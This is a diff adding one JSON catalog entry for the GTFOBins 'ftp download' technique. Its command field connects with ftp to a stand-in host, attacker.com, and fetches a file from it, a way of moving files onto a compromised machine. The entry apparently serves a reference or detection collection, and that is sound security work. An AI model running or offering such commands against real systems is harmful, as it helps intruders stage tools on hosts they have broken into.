@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-ftp-download",
+  "name": "GTFOBins · ftp (download)",
+  "command": "ftp -a attacker.com\nget /path/to/input-file output-file",
+  "description": "Use ftp to download via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "ftp",
+    "download"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/ftp/#download",
+  "upstream_id": "ftp/download/0",
+  "category": "gtfobins",
+  "subcategory": "file-download",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/ftp/"
+    }
+  ]
+}
